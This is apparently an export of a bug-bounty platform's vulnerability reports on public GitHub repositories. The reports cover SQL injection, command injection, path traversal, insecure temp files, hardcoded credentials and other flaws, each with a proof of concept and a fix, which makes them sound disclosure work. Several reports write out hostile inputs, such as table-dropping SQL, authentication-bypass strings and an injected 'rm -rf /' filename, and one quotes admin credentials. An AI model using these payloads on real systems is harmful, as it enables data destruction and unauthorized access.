Case,ID,Repository,CWE,Severity,Submitted At,Approved At,Description
99,1745767457682,cake-tools/ClickExportTool,CWE-377: Insecure Temporary file,High,2025-04-29T07:06:36.000Z,2025-04-29T07:18:19.000Z,"POC: Insecure Temporary File Handling
Steps to Reproduce
Clone the repository:

git clone https://github.com/cake-tools/ClickExportTool.git

cd ClickExportTool
Configure the application as per the README.md, including populating settings.py.

Run the vulnerable script:

python task_runner.py

Observe that temporary files (temp.csv) are created in the working directory with predictable names and insecure permissions.

Root Cause Analysis
The application creates temporary files in an insecure manner, leading to multiple security risks:

Predictable Filenames (temp.csv):
An attacker can guess the filename and pre-create or overwrite it with malicious content.
This can lead to data corruption, code injection, or privilege escalation if the file is later processed with higher permissions.
World-Writable Directory (Default Working Dir):
Since the file is created in the current working directory (often /tmp or the project root), other users or processes may read, modify, or delete it.

No File Permissions Restriction:
The file is created with default permissions (typically rw-rw-r--), allowing other users on the system to read or modify it.

Vulnerable Code

with open('temp.csv', 'wb') as text_file:  # Predictable name, insecure location
    writer = csv.writer(text_file)

Exploit Scenarios
Race Condition Attack:
An attacker replaces temp.csv with a symlink to a critical system file (/etc/passwd).
When the script writes data, it corrupts system files instead.
Data Theft or Tampering:
A malicious user reads temp.csv to steal sensitive exported data.
Alternatively, they modify the file before the script reads it back, leading to data integrity issues.

Denial of Service (DoS):
An attacker pre-creates temp.csv as a directory, causing the script to crash when trying to write.

Why This Happens
Lack of Secure Temp File APIs: The code manually creates files instead of using tempfile.
No Randomization: Fixed filenames (temp.csv) make attacks trivial.
No Permission Hardening: Files inherit unsafe default permissions.

Security Implications
Exploitation can lead to:
1. Data Corruption (Malicious file overwrites)
2. Information Disclosure (Unauthorized file reads)
3. Privilege Escalation (If script runs as root)
4. Denial of Service (Crash via invalid file handling)
5. Arbitrary File Overwrite (Symlink attacks)

Suggested Fix
Use Python’s built-in tempfile module for secure handling:


import tempfile

# Creates a uniquely named temp file, readable only by the owner
with tempfile.NamedTemporaryFile(
    mode='wb', 
    prefix='clickexport_',  # Custom prefix for debugging
    suffix='.csv', 
    delete=False  # Optional: Keep file after close
) as text_file:
    writer = csv.writer(text_file)
    temp_path = text_file.name  # Store path if needed later

Additional Hardening Steps
Restrict Permissions:

os.chmod(temp_path, 0o600)  # Only owner can read/write

Clean Up Securely:
os.unlink(temp_path)  # Delete when done

Use TMPDIR Environment Variable (For custom secure temp locations)."
100,1745770751518,arindhimar/VideoStreamingPlatform/blob/ANIMEX/BackEnd/models/user.py,CWE-89 :SQL Injection,High,2025-04-27T16:19:11.000Z,2025-04-27T22:59:36.000Z,"Root Cause:
The SQL query directly concatenates user inputs (username and password) into the query string without parameterized queries or input sanitization. This exposes the application to SQL injection attacks, allowing attackers to manipulate the SQL statement execution.

Vulnerable code:
cur.execute(""SELECT * FROM users where username='"" + username + ""' and password='"" + password + ""'"")  # Line 52

Exploit Scenario:
An attacker could input malicious SQL statements such as ' OR 1=1 -- as the username and any string as the password. This would bypass authentication and grant unauthorized access. Similarly, an attacker could extract sensitive data by injecting UNION queries.

Vulnerable code:
cur.execute(""SELECT * FROM users where username='"" + username + ""' and password='"" + password + ""'"")  # Line 52

Why It Happens:
The application does not use secure coding practices like parameterized queries or ORM (Object Relational Mapping) frameworks, which prevent direct injection of user inputs into SQL statements.

Security Implications:
Exploitation can lead to:

Bypassing authentication.
Unauthorized access to sensitive data.
Data corruption or deletion.
Compromise of the database server.

Suggested Fix:
Use parameterized queries instead of string concatenation to prevent SQL injection
cur.execute(""SELECT * FROM users WHERE username = %s AND password = %s"", (username, password))

Consider implementing an ORM (Object-Relational Mapping) framework which handles parameter sanitization automatically.
Apply input validation to ensure that username and password fields contain only expected characters and formats before processing.
Limit database user privileges to only what's necessary for the application to function properly, reducing the potential impact of successful SQL injection attacks."
101,1745771934189,https://github.com/leartgjoni/c-sharp-hospital-crm/blob/master/EPatient/Views/Staff/ReservationDiagnose.cs,"CWE-22, CWE-23",Medium,2025-04-28T04:38:49.000Z,2025-04-28T06:22:29.000Z,"Vulnerability Type:
CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
Proof of Concept:
Vulnerable Code:
var filePath = ofd.FileName;
FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
Explanation:
The code uses the file path directly from the OpenFileDialog without validating it. An attacker could manipulate the file path to open sensitive system files.
Solution:
Validate the file path to ensure it resides within an allowed directory and check the file extension before opening it.
Example fix:
string[] allowedExtensions = { "".pdf"", "".docx"", "".png"", "".jpg"" };
string extension = Path.GetExtension(filePath).ToLower();

if (!allowedExtensions.Contains(extension))
{
    MessageBox.Show(""Unsupported file type."");
    return;
}

using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
{
    byte[] file = new byte[stream.Length];
    stream.Read(file, 0, file.Length);
    FileUploaded.FileBytes = file;
}

Severity: High

Root Cause:
The application trusts the file path selected through OpenFileDialog without verifying or sanitizing it, allowing arbitrary files to be accessed or read if the dialog is bypassed or compromised.

Exploit Scenario:
An attacker could select a critical system file, like C:\Windows\System32\drivers\etc\hosts, during upload. The application would read and store this file without restriction, leaking sensitive system configuration data.

Why It Happens:
The vulnerability occurs because the code directly uses user-supplied file paths without enforcing validation rules or restricting file access to safe directories.

Security Implications:
If exploited, attackers could access, leak, or upload sensitive system files, causing potential data breaches, unauthorized access to configuration files, or corruption of application data.

Suggested Fix:
diff --git a/EPatient/Views/Staff/ReservationDiagnose.cs b/EPatient/Views/Staff/ReservationDiagnose.cs
index abcdef1..1234567 100644
--- a/EPatient/Views/Staff/ReservationDiagnose.cs
+++ b/EPatient/Views/Staff/ReservationDiagnose.cs
@@ private void btnUpload_Click(object sender, EventArgs e)
-        private void btnUpload_Click(object sender, EventArgs e)
-        {
-            using (OpenFileDialog ofd = new OpenFileDialog(){Multiselect = false, ValidateNames = true})
-            {
-                if (ofd.ShowDialog() == DialogResult.OK)
-                {
-                    var filePath = ofd.FileName;
-                    FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read);
-                    int intLength = Convert.ToInt32(stream.Length);
-                    byte[] file = new byte[intLength];
-                    stream.Read(file, 0, intLength);
-                    stream.Close();
-                    FileUploaded.FileBytes = file;
-                    string[] strPath = filePath.Split(Convert.ToChar(@""\""));
-                    FileUploaded.FileName = strPath[strPath.Length - 1];
-                    btnUpload.Enabled = false;
-                }
-            }
-        }
+        private void btnUpload_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog ofd = new OpenFileDialog() { Multiselect = false, ValidateNames = true })
+            {
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    var filePath = ofd.FileName;
+                    var allowedExtensions = new string[] { "".pdf"", "".docx"", "".png"", "".jpg"", "".jpeg"" };
+                    var extension = Path.GetExtension(filePath).ToLower();
+
+                    if (!allowedExtensions.Contains(extension))
+                    {
+                        MessageBox.Show(""Unsupported file type. Please upload a valid document or image."");
+                        return;
+                    }
+
+                    using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                    {
+                        byte[] file = new byte[stream.Length];
+                        stream.Read(file, 0, file.Length);
+                        FileUploaded.FileBytes = file;
+                    }
+                    FileUploaded.FileName = Path.GetFileName(filePath);
+                    btnUpload.Enabled = false;
+                }
+            }
+        }
"
102,1745774292373,https://github.com/pritipsingh/formData/blob/main/src/Components/Upload.jsx,CWE- 434,High,2025-04-27T17:18:12.000Z,2025-04-28T05:17:37.000Z,"Vulnerability Type:
CWE-434: Unrestricted Upload of File with Dangerous Type

The application allows uploading files without verifying their actual type.

Proof of Concept:
Vulnerable Code:

<input
  type=""file""
  accept=""image/*""
  onChange={handleFileChange}
/>
Explanation:

The application only checks if the file input accepts image/* through the browser hint.

It does not verify the real file type (MIME type) or check the file content (""magic bytes"").

A malicious file (e.g., .php or .exe) renamed as .jpg can be uploaded successfully.

Steps:

Create a text file and save it as malicious.jpg.

Upload it using the upload field.

The application accepts it without verifying if it's really an image.

Severity:
High
(If combined with server misconfiguration, can lead to remote code execution.)

Root Cause:
The vulnerability arises because the code trusts the file extension and client-side MIME type hints without server-side or actual file content validation. This allows malicious non-image files to be uploaded undetected.

Exploit Scenario:
An attacker can upload a fake .jpg file containing malicious code (like a PHP webshell or a JavaScript payload). If the backend stores and executes it, the attacker can gain full server control, access sensitive files, or deface the website.

Why It Happens:
The application assumes that files selected by the user are safe if their extension or MIME type matches expected types (e.g., image/jpeg). However, file extensions and Content-Type headers can be spoofed easily by attackers, and without deep inspection, the system trusts unsafe files.

Security Implications:
If exploited, the attacker can:

Upload executable malware.

Perform remote code execution.

Steal sensitive data from the server.

Deface or destroy application content.

Use the server as a pivot point to attack internal networks.

This can lead to complete compromise of the web application and infrastructure.

Suggested Fix:
Validate file types strictly on the server side, not just client-side.

Verify the file's magic numbers to confirm it matches expected file types (e.g., JPEG starts with FFD8).

Restrict accepted file types to a whitelist.

Reject or quarantine suspicious files immediately.

Set safe permissions and scan uploads using malware scanners if necessary.

Example frontend validation:


const allowedTypes = ['image/jpeg', 'image/png'];
if (!allowedTypes.includes(file.type)) {
  alert('Invalid file type. Only JPEG or PNG allowed.');
}
Example backend validation:

# Python (Django) example
if not uploaded_file.content_type.startswith('image/'):
    return HttpResponseForbidden(""Invalid file type."")"
103,1745774648191,https://github.com/aks13raut/GUI-for-Food-ordering-System,CWE-798,High,2025-04-27T17:24:08.000Z,2025-04-28T03:56:19.000Z,"Explanation:
The affected asset has hardcoded credentials for the database server. The credentials exposed belong to a super user / Administrator. This leads to complete database compromise and exposure to sensitive information.

POC:
The following line hardcodes sensitive credentials:

conn = pymysql.connect(host=""localhost"",user=""root"",password=""root123"",db=""foodmenu"")


Root Cause :
Line at the end of the script shop.py:
conn = pymysql.connect(host=""localhost"",user=""root"",password=""root123"",db=""foodmenu"")

Exploit Scenario:
If the code is leaked (e.g., via version control or backups), attackers can access the database with full privileges.

Why it Happens:
Credentials are embedded in source code instead of being loaded from a secure environment variable or configuration file.

Security Implications:
Full database compromise
Potential for lateral movement within the network

Suggested Fix:
Use environment variables or a secure configuration file to store credentials.

Patch:

python
import os

mydb=mysql.connector.connect(
    host=os.environ['DB_HOST'],
    user=os.environ['DB_USER'],
    passwd=os.environ['DB_PASS'],
    database=os.environ['DB_NAME']
)"
104,1745775084929,https://github.com/aks13raut/GUI-for-Food-ordering-System/tree/master,CWE-89,High,2025-04-27T17:31:24.000Z,2025-04-28T03:53:52.000Z,"Explanation:
The shop.py code contains SQL Injection due to unsanitized user input being directly concatenated into SQL queries. This allows attackers to execute arbitrary SQL statements, potentially leading to data theft, modification, or even complete database compromise.

POC:
Suppose a user sets the shop name to MyShop; DROP TABLE login_details; --. When the following line executes:

sqlQuery = ""SELECT * FROM ""+self.name+""_menu""


It becomes:

SELECT * FROM MyShop; DROP TABLE login_details; --_menu

This would drop the login_details table if the database allows multiple statements.


Root Cause: Shop.py File

Line 94 (getMenu):

sqlQuery = ""SELECT * FROM ""+self.name+""_menu""
curs.execute(sqlQuery)
Here, self.name is derived from user input, making the query vulnerable to SQL injection.

Line 215 (submit_order):

sqlQuery = ""UPDATE ""+self.name+""_menu SET rank=""+repr(food.rank+qnty)+"" WHERE food=""+repr(food.name)
curs.execute(sqlQuery)
Again, self.name and food.name are not sanitized.

Line 312 (savemenu):

sqlQuery = ""DELETE FROM ""+self.name+""_menu""
curs.execute(sqlQuery)
and

sqlQuery = ""INSERT INTO ""+self.name+""_menu VALUES(""+repr(food.name)+"", ""+repr(food.price)+"", ""+repr(food.rank)+"");""
curs.execute(sqlQuery)
Both use unsanitized user input for table and value names.

Exploit Scenario:
An attacker could input a malicious shop name or food name such as MyShop; DROP TABLE login_details; -- which would cause the application to execute unintended SQL commands, leading to data loss or corruption.

Why it Happens:
The code directly concatenates user-controlled input into SQL queries without any sanitization or use of parameterized queries. This allows attackers to inject arbitrary SQL code.


Security Implications:
Data Breach: Attackers could read sensitive data from the database.
Data Loss: Attackers could drop tables, delete data, or corrupt the database.
Privilege Escalation: Attackers could modify authentication data or escalate privileges.


Suggested Fix:
Never concatenate user input directly into SQL queries.
Use parameterized queries for all SQL statements.
Validate and sanitize all user input, especially when constructing table or column names.


Patch fix for getMenu:

def getMenu(self):
    self.menu = foodmenu.Menu()
    # Only allow alphanumeric and underscores in table names
    if not re.match(r'^\w+$', self.name):
        raise ValueError(""Invalid shop name"")
    table_name = f""{self.name}_menu""
    sqlQuery = f""SELECT * FROM `{table_name}`""
    curs.execute(sqlQuery)
    foods = curs.fetchall()
    for values in foods:
        food = foodmenu.Food(*values)
        self.menu.add(food)
    self.menu.reduceRanks()

Use a regular expression to validate self.name.
Use backticks to quote table names and prevent injection.

For queries with values, always use placeholders:

sqlQuery = f""UPDATE `{table_name}` SET rank=%s WHERE food=%s""
curs.execute(sqlQuery, (food.rank+qnty, food.name))"
105,1745776376115,https://github.com/IamLucif3r/Chat-On/tree/main,"CWE-319, CWE-829",Low,2025-04-28T12:49:43.000Z,2025-04-28T23:57:56.000Z,"As per the feedback, I am merging the two findings into one, and also pointing out the filename in the explanation below:
=================================================================

Bug -1 CWE-319

Explanation: The server uses plain TCP sockets without encryption, so all messages and commands are sent in clear text over the network. This allows anyone on the same network to sniff the traffic and read sensitive information such as nicknames, admin commands, and passwords.


POC: Use a network packet sniffer (e.g., Wireshark) on the same network to capture the traffic between client and server; observe that all data, including the admin password ""adminpass"", is transmitted in plaintext.


Root Cause: Server.py
Line 1-4 in server.py: Use of socket.socket(socket.AF_INET, socket.SOCK_STREAM) without any encryption layer.
Lines handling messages (handle function) and authentication (receive function) transmit data directly over the socket without encryption.


Exploit Scenario: An attacker on the same local network can sniff the TCP packets and obtain the admin password or other chat messages, enabling unauthorized access or eavesdropping.


Why it Happens: The code does not implement any encryption or secure transport layer protocols like TLS/SSL for the socket communication.

Security Implications: Exposure of sensitive data (passwords, chat messages) to network attackers; potential unauthorized admin access.


Suggested Fix: Use Python's ssl module to wrap the socket with TLS for encrypted communication.
Patch: 

import ssl

# Wrap the server socket with SSL
context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen()

# Accept connections with SSL wrapping
def receive():
    while True:
        client_socket, address = server.accept()
        ssl_client = context.wrap_socket(client_socket, server_side=True)
        # Proceed using ssl_client instead of client_socket
=================================================================
Bug - 2 CWE-829


Explanation:
The server trusts client-sent nicknames and commands without sanitization or validation, allowing clients to send commands like KICK or BAN if they spoof the admin nickname or manipulate protocol messages.

POC:
A client can send a nickname ""admin"" and attempt to send KICK or BAN commands. Although password is checked, the lack of strong authentication and validation can be exploited if password checks fail or are bypassed.

Root Cause: Server.py
Lines ~26-37 in server.py, where messages are parsed and commands executed based on nickname:

if nicknames[clients.index(client)] == 'admin':
    # execute kick/ban


Exploit Scenario:
If authentication is weak or bypassed, unauthorized users can issue administrative commands.


Why it Happens:
No robust authentication or message validation protocol is implemented.


Security Implications:
Unauthorized administrative actions can disrupt chat service and user experience.


Suggested Fix:
Implement stronger authentication mechanisms.
Use session tokens or certificates rather than relying on nickname strings.
Validate and sanitize all client inputs strictly.

Modify the receive() function to set authentication state:

def receive():
    while True:
        client, address = server.accept()
        print(f""Connected with {str(address)}"")
        client.send('NICK'.encode('ascii'))
        nickname = client.recv(1024).decode('ascii')

        with open('bans.txt', 'r') as f:
            bans = f.readlines()

        if nickname + '\n' in bans:
            client.send('BAN'.encode('ascii'))
            client.close()
            continue

        is_admin = False
        if nickname == 'admin':
            client.send('PASS'.encode('ascii'))
            password = client.recv(1024).decode('ascii')
            if password != 'adminpass':
                client.send('REFUSE'.encode('ascii'))
                client.close()
                continue
            is_admin = True

        nicknames.append(nickname)
        clients.append(client)
        client_auth[client] = {'nickname': nickname, 'is_admin': is_admin}

        print(f'Nickname of the client is {nickname}')
        broadcast(f'{nickname} joined the Chat'.encode('ascii'))
        client.send('Connected to the Server!'.encode('ascii'))

        thread = threading.Thread(target=handle, args=(client,))
        thread.start()"
106,1745777391918,https://github.com/TusharKukra/LMS-Library-Management-System,CWE-840,Medium,2025-04-27T18:09:51.000Z,2025-04-28T06:21:13.000Z,"C++ Library Management System - Logical Flaws in Book Management

---

Affected Components:  
- `bookissue()` and `bookdeposit()` functions in `LMSCode.cpp`  
- `book` and `student` class logic  

---

Root Cause:  
1. Missing Book Status Tracking:  
   The `book` class lacks an `issued` flag or copy counter, allowing the same book to be issued to multiple students.  
2. Incorrect Fine Calculation:  
   The formula `(day-15)*1` in `bookdeposit()` hardcodes a 1 Rs/day fine instead of 15 Rs/day.  
3. No Validation for Returns:  
   Students can return books they never borrowed, corrupting the `token` system.  
4. Unrestricted Token Logic:  
   The `token` variable is not linked to actual book availability, enabling over-issuance and invalid returns.  

---

Exploit Scenarios:  
1. Duplicate Book Issuance:  
1. Admin creates a book (`bno = ""B101""`).  
2. Student A (`admno = ""S001""`) issues `B101` successfully.  
3. Student B (`admno = ""S002""`) issues `B101` again.  
Result: Both students hold the same book, leading to inventory chaos.  
2. Financial Loss via Incorrect Fines:  
1. Student returns a book after 20 days.  
2. System calculates fine as `(20-15)*1 = 5 Rs` instead of `(20-15)*15 = 75 Rs`.  
Result: Financial loss due to undercharging.  

3. Invalid Book Returns:  
1. Student `S001` (with no issued books) selects ""Book Deposit"".  
2. System resets their `token` to `0` despite no prior issuance.  
Result: Data inconsistency in `student.dat`.  

---

Why It Happens:  
- No Book Status: The `book` class does not track issuance state.  
- Hardcoded Fine Logic:  
  ```cpp
  // Flawed calculation in bookdeposit()
  fine = (day-15)*1; // Should be (day-15)*15
  ```  
- Lax Token Checks:  
  ```cpp
  // Missing validation in bookdeposit():
  if (token == 1) { ... } // No check for actual book ownership
  ```  

---

Security Implications:  
- Data Corruption: Inventory mismanagement due to duplicate issuance.  
- Financial Loss: Incorrect fines undercharge users.  
- Operational Failure: Invalid returns/issuances make the system unreliable.  

---

Suggested Fixes:  
1. Add Book Status Tracking:  
   ```cpp
   class book {
     // ...
     bool issued; // New field
     int copies;  // Track available copies
   };
   ```  
2. Validate Book Availability:  
   ```cpp
   // In bookissue():
   if (bk.copies > 0) {
     bk.copies--; // Decrement on issuance
     st.addtoken();
   } else {
     cout << ""Book unavailable!"";
   }
   ```  
3. Correct Fine Calculation:  
   ```cpp
   fine = (day > 15) ? (day - 15) * 15 : 0;
   ```  
4. Enforce Return Validation:  
   ```cpp
   // In bookdeposit():
   if (st.rettoken() == 0) {
     cout << ""No book issued!"";
     return;
   }
   ```  

---


Proof of Concept (PoC):  
Steps:  
1. Create a Book:  
   - `bno = ""B101""`, `copies = 1` (if implemented).  
2. Issue to Student A:  
   - `S001` issues `B101` (successful).  
3. Issue to Student B:  
   - `S002` issues `B101` (successful if no copy tracking).  
4. Return After 20 Days:  
   - Fine displayed: 5 Rs (incorrect).  

Output:  
```plaintext
Book B101 issued to S001  
Book B101 issued to S002  <-- Flaw: Duplicate issuance  
Fine for S001: 5 Rs       <-- Flaw: Should be 75 Rs  
```  

---
Mitigation:  
Implement the fixes above to ensure:  
- Books cannot be over-issued.  
- Fines reflect the correct rate.  
- Returns require valid prior issuance."
107,1745777456794,0xFrapples/spfm,CWE-78,Critical,2025-04-27T18:10:56.000Z,2025-04-27T18:43:20.000Z,"Explanation: The code uses os.system() with string concatenation of user-controlled inputs without sanitization or validation, allowing arbitrary command injection.


POC:
If an attacker inputs a filename such as ""; rm -rf / # during the delete (//del) command, the constructed command becomes:
rm -rf /root/""; rm -rf / #
which executes the dangerous rm -rf / command, potentially wiping the system.


Root Cause:

spfm.py:
Line 103: os.system(f'rm -rf {currentDir}/{r1}')
Line 117: os.system(f'cd {currentDir} && cp {r1} {r2} && rm -rf {r1}')

Both use unsanitized user input r1 and r2 directly in shell commands.


Exploit Scenario:
An attacker inputs malicious filenames or directory names containing shell metacharacters to execute arbitrary commands with the privileges of the running script.


Why it Happens:
Lack of input validation and use of os.system() with string formatting allows shell injection.


Security Implications:
Full system compromise, data loss, privilege escalation, or denial of service.


Suggested Fix:
Use Python's subprocess module with argument lists to avoid shell interpretation:

import subprocess

# For delete
subprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)

# For rename (copy + delete)
subprocess.run(['cp', os.path.join(currentDir, r1), os.path.join(currentDir, r2)], check=True)
subprocess.run(['rm', '-rf', os.path.join(currentDir, r1)], check=True)"
108,1745778403676,https://github.com/gaetanBloch/nodejs-shopping,CWE-521,Very Low,2025-04-27T18:26:43.000Z,2025-04-28T03:44:45.000Z,"Vulnerability Type
CWE-521: Weak Password Requirements

Proof of Concept
In the file ./routes/auth.js there is this code-

return body('password', 'Please enter a password with only numbers and ' +
    'text and at least 5 characters.')
    .isLength({ min: 5 })
    .isAlphanumeric()
    .trim();
};

Here the password is being tested whether it is 5 characters long and is made up of alphanumeric characters. This is not secure as this allows simple passwords like '12345' and 'password' to be acccepted by the application. These passwords can be guessed/brute forced and can lead to account compromise.

Severity
1

Root Cause
Insufficient backend-side checks for minimum password complexity (length, digits, uppercase, special characters).

Exploit Scenario
The attackers can brute force the accounts using list of simple passwords and there is some chance that they may get an account password and then compromise it.

Why it Happens?
Developers assume users will choose strong passwords on their own, or rely only on client-side checks.

Security Implications
Account takeovers because this vulenrability makes it easier to brute-force passwords.

Suggested fix
Enforce strong passwords on server side (length + complexity) like-
    Minimum 8 characters
    At least one lowercase letter
    At least one uppercase letter
    At least one digit
    At least one special character"
109,1745778472698,https://github.com/heli-toon/LBSHS-LMS,CWE-89,High,2025-04-27T18:27:52.000Z,2025-04-28T03:46:51.000Z,"SQL Injection in returnbooks() → return_record()
Summary
The SQL injection vulnerability in the returnbooks() → return_record() method allows attackers to inject malicious SQL code into the deletion query. This could lead to unauthorized data deletion, database corruption, or complete system compromise if exploited.

Description
The return_record() function in the returnbooks() module constructs a SQL query by directly concatenating user-controlled input (stored_id) into the statement. The vulnerable code is:

python
cursor.execute(""DELETE from issues where oid="" + stored_id)  # SQL Injection here
Since stored_id is derived from the selected row in the Treeview (which can be manipulated by an attacker), this allows arbitrary SQL execution. For example:

sql
1; DROP TABLE issues; --
This payload would delete the entire issues table.

Impact
Unauthorized Data Deletion:

Attackers can delete critical records or entire tables (e.g., DELETE FROM books;).

Database Corruption:

Malicious commands like DROP TABLE can erase schema structures.

Privilege Escalation:

If the database user has elevated privileges, attackers could execute OS commands (e.g., COPY to write files).

Proof of Concept (PoC)
Payload:

sql
1; DROP TABLE issues; --  
Exploited Query:

sql
DELETE FROM issues WHERE oid=1; DROP TABLE issues; --  
Result:

The issues table is permanently deleted.

Steps to Reproduce
Log in as Admin:

Use credentials masteradmin/m@$+erp@$$w0rd.

Add Malicious Entry to issues Table:

Navigate to Issue Books.

Set Ascension No to 1; DROP TABLE issues; --.

Fill other fields (e.g., Book Title: Hacked, Issued To: Attacker).

Click Submit.

Trigger the Exploit:

Go to Return Books.

Select the malicious entry with Ascension No = 1; DROP TABLE issues; --.

Click Return.

Verify Exploitation:

Check if the issues table is deleted (e.g., attempt to view issued books).

Recommended Fix
1. Use Parameterized Queries
Replace the insecure code with:

python
cursor.execute(""DELETE FROM issues WHERE oid=?"", (stored_id,))  
2. Input Validation
Ensure stored_id is numeric:

python
if not stored_id.isdigit():  
    raise ValueError(""Invalid ascension number"")  
3. Least Privilege Principle
Restrict the database user’s permissions to prevent DROP/ALTER commands."
110,1745779788259,https://github.com/warlordthesaviour/GeekWars,CWE-89,Critical,2025-04-27T18:49:48.000Z,2025-04-28T06:32:29.000Z,"Vulnerability Type:
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Proof of Concept:
Here is the vulnerable code in question:

const userExist = (username, cb) => query.select(`SELECT count(id) from users where username = '${username}'`, cb);
Step-by-step Explanation:
In this case, the query directly embeds user input (username) into the SQL string without sanitizing it. An attacker could exploit this by submitting the following malicious input as the username:

""rahul""; DROP TABLE users; --""
This will modify the SQL query as follows:

SELECT count(id) from users where username = 'rahul'; DROP TABLE users; --';
What happens here:

The first part of the query (SELECT count(id) from users where username = 'rahul';) will execute normally and return the result for the username ""rahul"".

The second part (DROP TABLE users;) is injected into the query. This SQL statement is executed after the first part and will attempt to drop (delete) the entire users table from the database.

The -- marks the rest of the query as a comment, effectively ignoring any subsequent SQL code, which prevents errors from the rest of the original query.

As a result, the attacker not only bypasses the logic intended to check if the user exists but also deletes the entire users table, leading to a catastrophic loss of data.

Severity:Critical


Root Cause:
The root cause of this vulnerability is the direct inclusion of user input into SQL queries without proper validation or sanitization. By concatenating the username directly into the query string, the application allows malicious users to inject arbitrary SQL commands. The lack of proper input sanitization or the use of parameterized queries results in the system treating the user input as part of the SQL statement, which attackers can manipulate for harmful purposes. This flaw is common in applications that dynamically generate SQL queries based on user input.

Exploit Scenario:
In this scenario, an attacker submits the following username as input:

""rahul""; DROP TABLE users; --""
This input alters the query, causing the following sequence of events:

The first part of the query will check if the username ""rahul"" exists, which could return a valid result.

The second part of the injected input, DROP TABLE users;, will execute after the initial query and will delete the users table from the database.

The -- comment syntax ensures that the rest of the query (if any) is ignored, preventing errors or unintended consequences in the query's execution.

This could allow the attacker to cause significant damage to the database, such as deleting user data or completely wiping important tables, leading to a major disruption of service.

Why It Happens:
This vulnerability occurs because the application constructs SQL queries by directly embedding user input into the query string, without validating or sanitizing the input. SQL queries need to treat user input as data rather than executable code to prevent an attacker from altering the query’s logic. The failure to separate user input from SQL statements and the reliance on manual concatenation rather than using parameterized queries is what enables the attacker to inject arbitrary SQL commands and exploit the vulnerability.

Security Implications:
The exploitation of this vulnerability can lead to severe security consequences. An attacker can manipulate the SQL query to execute malicious commands, such as:

Dropping tables (DROP TABLE), resulting in loss of data and potentially a critical part of the application’s functionality.

Reading sensitive data (e.g., passwords, emails, personal information) by altering the query to retrieve data from other tables.

Modifying or deleting records from the database, leading to data corruption, unauthorized access, or even the complete destruction of the database.

Escalating privileges to gain full administrative access, depending on the database configuration and permissions.

In a worst-case scenario, the attacker could gain full control over the database, compromising the integrity of the application and its data.

Suggested Fix:
To resolve this issue, the code should use parameterized queries or prepared statements to ensure that user input is treated as data, not part of the query. This method separates the SQL code from the data and prevents any user input from being executed as part of the SQL statement. Here's an example of how to fix the vulnerable query:

const userExist = (username, cb) => query.select('SELECT count(id) from users where username = $1', [username], cb);
By using $1 as a placeholder and passing the username as a parameter (instead of embedding it directly into the query string), the database will safely handle the user input. This ensures that the input is treated as a value and not executable SQL code, effectively preventing SQL injection attacks. Parameterized queries are the industry-standard approach to preventing SQL injection and should be used throughout the application."
